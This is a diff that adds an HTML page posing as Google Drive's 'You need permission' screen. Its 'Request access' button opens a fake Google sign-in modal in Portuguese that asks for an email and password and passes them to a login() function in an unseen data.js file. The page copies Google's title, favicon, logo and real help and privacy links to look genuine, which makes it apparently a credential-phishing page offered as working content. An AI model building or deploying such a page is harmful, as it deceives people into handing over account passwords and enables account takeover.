@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <meta name="description" content="Web word processing, presentations and spreadsheets">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+        <link rel="shortcut icon" href="/images/drive_favicon1.ico">
+        <title>Google Drive - Access Denied</title>
+        <link rel="stylesheet" type="text/css" href="css/main.css">
+        <script type="text/javascript">
+            if (window.location.protocol == "http:") {
+                var restOfUrl = window.location.href.substr(5);
+                window.location = "https:" + restOfUrl;
+            }
+        </script>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+        <script type="text/javascript" src="javascript/data.js"></script>
+    </head>
+    <body onload="getInformation();">
+        <div id="outerContainer">
+            <div id="innerContainer">
+                <div style="position: absolute; top: -80px;">
+                    <div id="drive-logo">
+                        <span class="docs-drivelogo-img"></span>
+                        <span class="docs-drivelogo-text"> Drive</span>
+                    </div>
+                </div>
+                <div style="clear:both"></div>
+                <div id="main">
+                    <div id="accessDeniedIcon"></div>
+                    <p id="accessDeniedHeader">You need permission</p>
+                    <div id="message">
+                        <p>Want in? Ask for access, or switch to an account with permission.</p>
+                    </div>
+                    <p id="buttons" style="padding-top: 10px">
+                        <button id="requestButton" style="font-weight:bold; cursor:pointer;" class="jfk-button jfk-button-action" 
+                        onclick="document.getElementById('modal').style.display='block'">Request access</button>
+                    </p>
+                    <div id="modal">
+                        <div id="w3-modal-content" style="border-radius:5px; padding: 25px;">
+                          <img src="/images/googlelogo_color.png" id="modal-img-logo"></img>
+                          <span id="login-modal">Fazer login</span>
+                          <span id="process-modal">Prosseguir para o Google Drive</span>
+     
+                          <input  type="email" class="form-control" id="email-input" aria-describedby="emailHelp" placeholder="E-mail ou telefone">
+                          <input type="password" class="form-control" id="password-input" placeholder="Senha">
+                          <div style="align-self:flex-start; margin-top: 10px">
+                            <span id="forgot" onclick="window.open('https://support.google.com/accounts?hl=pt')">Esqueceu sua senha?</span>
+                          </div>
+                       
+                    
+                          <span id="alert">Não está no seu computador? Use o modo visitante para fazer login com privacidade. <span id="saibamais"> Saiba mais</span></span>
+                          <div style="align-self:flex-end; margin-top: 10px">
+                           
+                            <button id="buttonsend" type="button" class="btn btn-primary" onclick="login()">Solicitar</button>
+                          </div>
+                          
+                          <div style="align-self:flex-end; margin-top: 50px">
+                          <span style="color: #757575; margin-right:12px; cursor: pointer" onclick="window.open('https://support.google.com/accounts?hl=pt')">Ajuda</span>
+                          <span style="color: #757575; margin-right:12px; cursor: pointer" onclick="window.open('https://policies.google.com/privacy?gl=BR&hl=pt')">Privacidade</span>
+                          <span style="color: #757575; margin-right:12px; cursor: pointer" onclick="window.open('https://policies.google.com/terms?gl=BR&hl=pt')">Termos</span>
+                        </div>
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+    
+</html>
